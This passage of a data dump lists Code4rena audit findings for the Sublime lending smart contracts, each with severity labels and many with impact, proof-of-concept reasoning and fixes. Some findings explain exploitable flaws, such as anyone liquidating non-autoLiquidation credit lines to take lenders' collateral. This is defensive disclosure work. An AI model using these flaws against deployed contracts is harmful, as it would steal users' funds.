poolConstants.poolSavingsStrategy = _poolSavingsStrategy;     poolConstants.borrowAmountRequested = _borrowAmountRequested;     _initialDeposit(_borrower, _collateralAmount, _transferFromSavingsAccount);     poolConstants.borrower = _borrower;     poolConstants.borrowRate = _borrowRate;     poolConstants.noOfRepaymentIntervals = _noOfRepaymentIntervals;     poolConstants.repaymentInterval = _repaymentInterval;     poolConstants.lenderVerifier = _lenderVerifier;      poolConstants.loanStartTime = block.timestamp.add(_collectionPeriod);     poolConstants.loanWithdrawalDeadline = block.timestamp.add(_collectionPeriod).add(_loanWithdrawalDuration);     __ReentrancyGuard_init();     __ERC20_init('Pool Tokens', 'PT');     try ERC20Upgradeable(_borrowAsset).decimals() returns(uint8 _decimals) {         _setupDecimals(_decimals);     } catch(bytes memory) {} } ```  "}, {"title": "`initializer` functions can be front run", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/106", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-sublime-findings", "body": "`initializer` functions can be front run"}, {"title": "Best Practice: Contract file name should follow coding conventions", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/105", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  WatchPug   # Vulnerability details  Having a consistent naming style in the project leads to fewer errors.  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Proxy.sol#L6-L6  ```solidity=6 contract SublimeProxy is TransparentUpgradeableProxy { ```  The filename `Proxy.sol` should be `SublimeProxy.sol`.  "}, {"title": "Missing timelock for critical contract setters of privileged roles (Price Oracles)", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/103", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  Setter functions for critical contract parameters accessible only by privileged roles e.g. admin should consider adding timelocks (along with emitted events) so that users and other privileged roles can detect upcoming changes and have the time to react to them.  Changes to whitelists, oracle addresses and migrator address may have a financial or trust impact on users who should be given an opportunity to react to them by exiting/engaging without being surprised when such changes are made effective immediately.  See similar Medium-severity finding in ConsenSys's Audit of 1inch Liquidity Protocol (https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/#unpredictable-behavior-for-users-due-to-admin-front-running-or-general-bad-timing)    ## Proof of Concept  1. Navigate to the following contract.  https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/PriceOracle.sol#L189  https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/PriceOracle.sol#L203  2. The functions are responsible for the price oracles. Therefore, If the price oracle is set to wrong. All price feeds will be affected by this.   ## Tools Used  None  ## Recommended Mitigation Steps  Consider adding timelocks to such contracts with critical setter functions.    "}, {"title": "Use of _msgSender()", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/102", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "Use of _msgSender()"}, {"title": "Unnecessary receive()", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/99", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact There doesn't seem to be a use case for the existence of the `receive()` function. In fact, I will recommend removing it as it will prevent accidental native token transfers to the contract.  ## Proof of Concept https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/SavingsAccount/SavingsAccount.sol#L481  ## Tools Used VSC ## Recommended Mitigation Steps https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/SavingsAccount/SavingsAccount.sol#L481  "}, {"title": "Missing approve(0)", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/97", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  There are 3 instances where the `IERC20.approve()` function is called only once without setting the allowance to zero. Some tokens, like USDT, require first reducing the address' allowance to zero by calling `approve(_spender, 0)`. Transactions will revert when using an unsupported token like USDT (see the `approve()` function requirement [at line 199](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code)).  ## Proof of Concept  - [CreditLine/CreditLine.sol:647](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L647) - [CreditLine/CreditLine.sol:779](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L779) - [yield/AaveYield.sol:324](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/AaveYield.sol#L324)  Note: the usage of `approve()` in yield/CompoundYield.sol ([lines 211-212](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/CompoundYield.sol#L211-L212)), in yield/YearnYield.sol ([lines 211-212](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/YearnYield.sol#L210-L211)), and in yield/AaveYield.sol ([lines 297-298](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/AaveYield.sol#L297-L298)) do not need modification since it they already use the recommended approach. Additionally the usage of `approve()` in [yield/AaveYield.sol:307](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/AaveYield.sol#L307) likely does not need modification since that approve function only handles ETH.  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Use `approve(_spender, 0)` to set the allowance to zero immediately before each of the existing `approve()` calls.  "}, {"title": "Anyone can liquidate credit line when autoLiquidation is false without supplying borrow tokens", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/96", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  harleythedog   # Vulnerability details  ## Impact It is intended that if a credit line has autoLiquidation as false, then only the lender can be the liquidator (see docs here: https://docs.sublime.finance/sublime-docs/smart-contracts/creditlines). However, this is not correctly implemented, and anyone can liquidate a position that has autoLiquidation set to false.   Even worse, when autoLiquidation is set to false, the liquidator does not have to supply the initial amount of borrow tokens (determined by `_borrowTokensToLiquidate`) that normally have to be transferred when autoLiquidation is true. This means that the liquidator will be sent all of the collateral that is supposed to be sent to the lender, so this represents a huge loss to the lender. Since the lender will lose all of the collateral that they are owed, this is a high severity issue.  ## Proof of Concept The current implementation of liquidate is here: https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L996.  Notice that the autoLiquidation value is only used in one place within this function, which is in this segment of the code: ``` ...  if (creditLineConstants[_id].autoLiquidation && _lender != msg.sender) {   uint256 _borrowTokens = _borrowTokensToLiquidate(_borrowAsset, _collateralAsset, _totalCollateralTokens);   if (_borrowAsset == address(0)) {    uint256 _returnETH = msg.value.sub(_borrowTokens, 'Insufficient ETH to liquidate');    if (_returnETH != 0) {     (bool success, ) = msg.sender.call{value: _returnETH}('');     require(success, 'Transfer fail');    }   } else {   IERC20(_borrowAsset).safeTransferFrom(msg.sender, _lender, _borrowTokens);   }  }    _transferCollateral(_id, _collateralAsset, _totalCollateralTokens, _toSavingsAccount);   emit  CreditLineLiquidated(_id, msg.sender); } ```  So, if `autoLiquidation` is false, the code inside of the if statement will simply not be executed, and there are no further checks that the sender HAS to be the lender if `autoLiquidation` is false. This means that anyone can liquidate a non-autoLiquidation credit line, and receive all of the collateral without first transferring the necessary borrow tokens.  For a further proof of concept, consider the test file here: https://github.com/code-423n4/2021-12-sublime/blob/main/test/CreditLines/2.spec.ts. If the code on line 238 is changed from `let  _autoLiquidation: boolean  =  true;` to `let  _autoLiquidation: boolean  =  false;`, all the test cases will still pass. This confirms the issue, as the final test case \"Liquidate credit line\" has the `admin` as the liquidator, which should not work in non-autoLiquidations since they are not the lender.   ## Tools Used Inspection and confirmed with Hardhat.  ## Recommended Mitigation Steps Add the following require statement somewhere in the `liquidate` function:  ``` require(  creditLineConstants[_id].autoLiquidation ||   msg.sender == creditLineConstants[_id].lender,  \"not autoLiquidation and not lender\"); ```  "}, {"title": "Two Steps Verification before Transferring Ownership", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/95", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  robee   # Vulnerability details   The following contracts have a function that allows them an admin to change it to a different address. If the admin accidentally uses an invalid address for which they do not have the private key, then the system gets locked. It is important to have two steps admin change where the first is announcing a pending new admin and the new address should then claim its ownership.  A similar issue was reported in a previous contest and was assigned a severity of medium: [code-423n4/2021-06-realitycards-findings#105](https://github.com/code-423n4/2021-06-realitycards-findings/issues/105)           ILendingPoolAddressesProvider.sol         IUniswapV3Factory.sol         Controller.sol         Strategy.sol         yVault.sol  "}, {"title": "CreditLine.liquidate allows for price manipulated liquidation", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/94", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "CreditLine.liquidate allows for price manipulated liquidation"}, {"title": "Use one require instead of several", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/93", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-sublime-findings", "body": "Use one require instead of several"}, {"title": "Redundant use safeMath", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/92", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact Using the safeMath to avoid redundant arithmetic underflow/overflow checks to save gas when an underflow/overflow cannot happen.   ## Proof of Concept https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L461  ``` if (_maxPossible > _currentDebt) {             return _maxPossible.sub(_currentDebt); ```  ## Tools Used  ## Recommended Mitigation Steps Consider using: ``` if (_maxPossible > _currentDebt) {             return _maxPossible - _currentDebt; ```  "}, {"title": "CreditLine.liquidate doesn't transfer borrowed ETH to a lender", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/90", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Funds that are acquired from a liquidator and should be sent to a lender are left with the contract instead. The funds aren't lost, but after the fact mitigation will require manual accounting and fund transfer for each CreditLine.liquidate usage.  ## Proof of Concept  ETH sent to CreditLine.liquidate by an external liquidator when `autoLiquidation` is enabled remain with the contract and aren't transferred to the lender: https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/CreditLine/CreditLine.sol#L1015  ## Recommended Mitigation Steps  Add transfer to a lender for ETH case:  Now: ``` if (_borrowAsset == address(0)) {   uint256 _returnETH = msg.value.sub(_borrowTokens, 'Insufficient ETH to liquidate');   if (_returnETH != 0) {     (bool success, ) = msg.sender.call{value: _returnETH}('');     require(success, 'Transfer fail');   } } ```  To be: ``` if (_borrowAsset == address(0)) {   uint256 _returnETH = msg.value.sub(_borrowTokens, 'Insufficient ETH to liquidate');      (bool success, ) = _lender.call{value: _borrowTokens}('');   require(success, 'liquidate: Transfer failed');      if (_returnETH != 0) {     (success, ) = msg.sender.call{value: _returnETH}('');     require(success, 'liquidate: Return transfer failed');   } } ```  "}, {"title": "calculateInterest() comments missing input parameter", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/87", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The public `calculateInterest` function in CreditLine.sol is missing a @param comment for the `_timeElapsed` parameter. This parameter is obviously important and the units should be clearly stated as seconds.  ## Proof of Concept  The `calculateInterest` function in CreditLine.sol: https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/CreditLine/CreditLine.sol#L385-L395   ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Add the following line to the `calculateInterest` function comments in CreditLine.sol: `* @param _timeElapsed Seconds elapsed since lastPrincipalUpdateTime`  "}, {"title": "CreditLine.sol assumes 365 day year", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/86", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-sublime-findings", "body": "CreditLine.sol assumes 365 day year"}, {"title": "No validation of protocol fee fraction", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/84", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `updateProtocolFeeFraction` function in CreditLine.sol does not validate the value submitted. Fee fractions of 0%, 100%, or 200% are equally valid. A maximum fee value check is recommended and a similar check is used in `_updateLiquidatorRewardFraction` in CreditLine.sol to set a maximum liquidator fraction. However, if the assumption is that the owner is trusted and does not make mistakes, this may not be considered a problem.   ## Proof of Concept  The `updateProtocolFeeFraction` function calls `_updateProtocolFeeFraction` in CreditLine.sol: https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L335-L338   ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Apply a maximum fee hard cap with a require statement to make sure the fee does not exceed a certain limit, whether by admin error or theoretical malicious overtake of the contract  "}, {"title": "`delete` doesn\u2019t delete mapping in struct", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/83", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "`delete` doesn\u2019t delete mapping in struct"}, {"title": "Magic number 30 could be a constant", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/82", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  There are many instances of the value 30, usually used for exponents of base 10. Currently this integer value is used directly without a clear indication that this value relates to the decimals value, which could lead to one of these values being modified but not the other (perhaps by a typo), which is the basis for many past hacks. Coding best practices suggests using a constant integer to store this value in a way that clearly explains the purpose of this value to prevent confusion.  ## Proof of Concept The magic number 30 is found in dozens of places, including:  Pool/Repayments.sol https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Repayments.sol#L164-L165  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Repayments.sol#L190  PriceOracle.sol file https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/PriceOracle.sol#L130-L131  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/PriceOracle.sol#L88-L93   ## Tools Used  Manual review  ## Recommended Mitigation Steps  Replace the magic number 30 with a variable explaining the meaning of this value, such as: `uint8 private constant DECIMALS_EXPONENT = 30;`  "}, {"title": "SavingsAccount withdrawAll and switchStrategy can freeze user funds by ignoring possible strategy liquidity issues", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/80", "labels": ["bug", "3 (High Risk)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "SavingsAccount withdrawAll and switchStrategy can freeze user funds by ignoring possible strategy liquidity issues"}, {"title": "`idealCollateralRatio` is confusingly named", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/79", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Weird naming ## Proof of Concept  Credit lines have an \"ideal collateral ratio\" which acts very much like a minimum collateral ratio, i.e. if you fall below it you can be liquidated.  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L1002  \"Ideal\" to me implies that you'll be hovering around that value sometimes drifting above and sometimes below but the systems drives the value back to the ideal so this is quite confusingly named imo.  ## Recommended Mitigation Steps  Change `idealCollateralRatio` to `minCollateralRatio`  "}, {"title": "CreditLine.borrow accepts ETH transfers", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/78", "labels": ["bug", "1 (Low Risk)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "CreditLine.borrow accepts ETH transfers"}, {"title": "Credit Line acceptance logic can be simplified to avoid SLOAD in some cases", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/77", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact gas costs  ## Proof of Concept  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L600-L604  ``` (msg.sender == creditLineConstants[_id].borrower && _requestByLender) || (msg.sender == creditLineConstants[_id].lender && !_requestByLender) ```  is equivalent to   ``` _requestByLender ? (msg.sender == creditLineConstants[_id].borrower) : (msg.sender == creditLineConstants[_id].lender) ``` or ``` msg.sender == (_requestByLender ? creditLineConstants[_id].borrower : creditLineConstants[_id].lender) ```  Which avoid loading the borrower address in the case where the borrower made the request.  ## Recommended Mitigation Steps  Use simplified logic  "}, {"title": "Argument order for SavingsAccount approval functions is odd", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/76", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Possible confusion  ## Proof of Concept  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/SavingsAccount/SavingsAccount.sol#L326-L368  Compare this to the standard ERC20 versions.  ``` approve(address spender, uint256 amount)  vs   approve(uint256 amount, address token, address to)  ```  Having the amount at the beginning is very odd imo and I'd expect it at the end.  ## Recommended Mitigation Steps  Change `approve(uint256 amount, address token, address to)` to `approve(address token, address to, uint256 amount)` and similar for other functions.  I'd also change `to` to the standard `spender` but this is nbd.     "}, {"title": "`getInterestOverdue` reverts rather than returning 0 when there is no overdue interest", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/74", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "`getInterestOverdue` reverts rather than returning 0 when there is no overdue interest"}, {"title": "LinkedAddress struct can be packed to save an SSTORE", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/72", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Gas costs on linking/unlinking addresses  ## Proof of Concept  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Verification/Verification.sol#L10-L13  The activation timestamp can be restricted to a `uint64` variable so that it shares a slot with the `masterAddress`. This will save an SSTORE and a substantial amount of gas.  ## Recommended Mitigation Steps  As above.  "}, {"title": "Contracts allow sending ETH on calls which does not expect it", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/71", "labels": ["bug", "1 (Low Risk)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "Contracts allow sending ETH on calls which does not expect it"}, {"title": "Unnecessary zero approvals in yield contracts", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/70", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-sublime-findings", "body": "Unnecessary zero approvals in yield contracts"}, {"title": "Duplicated code in Yield contracts", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/69", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "Duplicated code in Yield contracts"}, {"title": "`poolSizeLimit` does not account for differing unit values between borrow assets", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/68", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Inability to set a sensible range which covers all borrow assets without being overly wide.  ## Proof of Concept  `PoolFactory` has a set requirement that created pool must ask to borrow an amount of assets which are within a certain range as encoded in the `poolSizeLimit`.  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/PoolFactory.sol#L286  This doesn't take into account the relative values of each borrow asset so it's hard to choose a one-size-fits-all value for these limits (A 100 WBTC loan could be sensible but a 100 USDC loan will be dwarfs by the gas costs to deploy the pool.)  ## Recommended Mitigation Steps  Place limits on the USD value of the borrowed amount as reported by the factory's price oracle.  "}, {"title": "Typo in liquidateCancelPenalty natspec", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/67", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  Typo in \"cancelled\"  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L545  "}, {"title": "Check on `poolConstants.loanWithdrawalDeadline` for liquidation is unnecessary", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/66", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Gas costs  ## Proof of Concept  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L322-L340  In `Pool.withdrawBorrowedAmount` we set the loan to active and delete the withdrawal deadline (see link).  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L802  When checking whether we can liquidate the pool we check that the loan is active and that `block.timestamp > poolConstants.loanWithdrawalDeadline`. This second condition always resolves true as `poolConstants.loanWithdrawalDeadline = 0` after deletion. We can then save an SLOAD by skipping this second check.  ## Recommended Mitigation Steps  As above.  "}, {"title": "Repayments._transferTokens doesn't check msg.value in ETH case", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/61", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "Repayments._transferTokens doesn't check msg.value in ETH case"}, {"title": "Flattening nested mappings can save gas", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-sublime-findings", "body": "Flattening nested mappings can save gas"}, {"title": "Overflow in _repay()", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/58", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function repayPrincipal() calls _repay() with MAX_INT as parameter. In _repay() this value (_amount) is multiplied by 10**30. As _amount already has the maximum value of an int256 it will overflow. Because solidity 7.6.0 is used and mul() isn't used (!) this actually works. The resulting value is still large and thus the function repayPrincipal() does still work.  It is not recommended to rely on overflow working and when moving to solidity 0.8.x this will no longer work.  ## Proof of Concept https://github.com/code-423n4/2021-12-sublime/blob/e688bd6cd3df7fefa3be092529b4e2d013219625/contracts/Pool/Repayments.sol#L23  ```JS     uint256 constant MAX_INT = 2**256 - 1; ```  https://github.com/code-423n4/2021-12-sublime/blob/e688bd6cd3df7fefa3be092529b4e2d013219625/contracts/Pool/Repayments.sol#L377-L425  ```JS      function repayPrincipal(address payable _poolID) external payable nonReentrant isPoolInitialized(_poolID) {         ....         uint256 _interestToRepay = _repay(_poolID, MAX_INT, true);         ...   function _repay( ... uint256 _amount,..) internal returns (uint256) { ..         _amount = _amount * 10**30;     ```  ## Tools Used  ## Recommended Mitigation Steps Use safemath in _replay() and change MAX_INT to something like: ```JS uint256 constant LARGE_INT = 2**128 ``` Note: 10**30 ~ 2**100  "}, {"title": "transferTokens should use _from instead of msg.sender", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/57", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function transferTokens of SavingsAccountUtil.sol sends the excess ETH to msg.sender, while a _from parameter is also present in the function. It seems more logical to send it to _from, like the similar function _transferTokens of Repayments.sol  Luckily in the current code the _from is always msg.sender so it doesn't pose a direct risk. However if the code is reused or forked it might lead to unexpected issues.  Note: transferTokens and _transferTokens are very similar so they could be integrated; they have to be checked carefully when doing this  ## Proof of Concept https://github.com/code-423n4/2021-12-sublime/blob/e688bd6cd3df7fefa3be092529b4e2d013219625/contracts/SavingsAccount/SavingsAccountUtil.sol#L98-L127 ```JS function transferTokens(.... ,   address _from,   address _to ) {      ...        (bool success, ) = payable(address(msg.sender)).call{value: msg.value - _amount}(''); // uses msg.sender instead of _from // also uses - instead of sub  ```  https://github.com/code-423n4/2021-12-sublime/blob/e688bd6cd3df7fefa3be092529b4e2d013219625/contracts/Pool/Repayments.sol#L457-L473 ```JS     function _transferTokens(  address _from,  address _to,.... ) {        (bool refundSuccess, ) = payable(_from).call{value: msg.value.sub(_amount)}(''); ```  ## Tools Used  ## Recommended Mitigation Steps In function transferTokens() change msg.sender to _from   "}, {"title": "Unlinked address can link immediately again", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/54", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact After a master calls unlinkAddress() to unlink an address, the address that has just been unlinked can directly link again without permission. The address that is just unlinked can call linkAddress(masterAddress) which will execute because pendingLinkAddresses is still set. Assuming the master has unlinked for a good reason it is unwanted to be able to be linked again without any permission from the master.  Note: a master can prevent this by calling cancelAddressLinkingRequest(), but this doesn't seem logical to do  ## Proof of Concept https://github.com/code-423n4/2021-12-sublime/blob/e688bd6cd3df7fefa3be092529b4e2d013219625/contracts/Verification/Verification.sol#L129-L154  ```JS     function unlinkAddress(address _linkedAddress) external {         address _linkedTo = linkedAddresses[_linkedAddress].masterAddress;         require(_linkedTo != address(0), 'V:UA-Address not linked');         require(_linkedTo == msg.sender, 'V:UA-Not linked to sender');         delete linkedAddresses[_linkedAddress];         ... }     function linkAddress(address _masterAddress) external {         require(linkedAddresses[msg.sender].masterAddress == address(0), 'V:LA-Address already linked');   // == true (after unlinkAddress)         require(pendingLinkAddresses[msg.sender][_masterAddress], 'V:LA-No pending request');                 // == true (after unlinkAddress)         _linkAddress(msg.sender, _masterAddress);                                                                                           // // pendingLinkAddresses not reset     }  function cancelAddressLinkingRequest(address _linkedAddress) external {         ...          delete pendingLinkAddresses[_linkedAddress][msg.sender]; // only location where pendingLinkAddresses is reset ```  ## Tools Used  ## Recommended Mitigation Steps Add something like to following at the end of linkAddress: ```JS  delete pendingLinkAddresses[msg.sender][_masterAddress];  ```  "}, {"title": "PoolFactory and CreditLine updateSavingsAccount will break the system in production as savings account hold current user records", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/53", "labels": ["bug", "1 (Low Risk)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "PoolFactory and CreditLine updateSavingsAccount will break the system in production as savings account hold current user records"}, {"title": "Unable To Call `emergencyWithdraw` ETH in `NoYield` Contract", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/52", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The `emergencyWithdraw` function is implemented in all yield sources to allow the `onlyOwner` role to drain the contract's balance in case of emergency. The contract considers ETH as a zero address asset. However, there is a call made on `_asset` which will revert if it is the zero address. As a result, ETH tokens can never be withdrawn from the `NoYield` contract in the event of an emergency.  ## Proof of Concept  Consider the case where `_asset == address(0)`. An external call is made to check the contract's token balance for the target `_asset`. However, this call will revert as `_asset` is the zero address. As a result, the `onlyOwner` role will never be able to withdraw ETH tokens during an emergency.  ``` function emergencyWithdraw(address _asset, address payable _wallet) external onlyOwner returns (uint256 received) {     require(_wallet != address(0), 'cant burn');     uint256 amount = IERC20(_asset).balanceOf(address(this));     IERC20(_asset).safeTransfer(_wallet, received);     received = amount; } ```  Affected function as per below: https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/yield/NoYield.sol#L78-L83  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider handling the case where `_asset` is the zero address, i.e. the asset to be withdrawn under emergency is the ETH token.  "}, {"title": "`PriceOracle` Does Not Filter Price Feed Outliers", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/51", "labels": ["bug", "3 (High Risk)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "`PriceOracle` Does Not Filter Price Feed Outliers"}, {"title": "Improper Validation Of Chainlink's `latestRoundData` Function", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/50", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "Improper Validation Of Chainlink's `latestRoundData` Function"}, {"title": "Natspec not matching function's logic", "html_url": 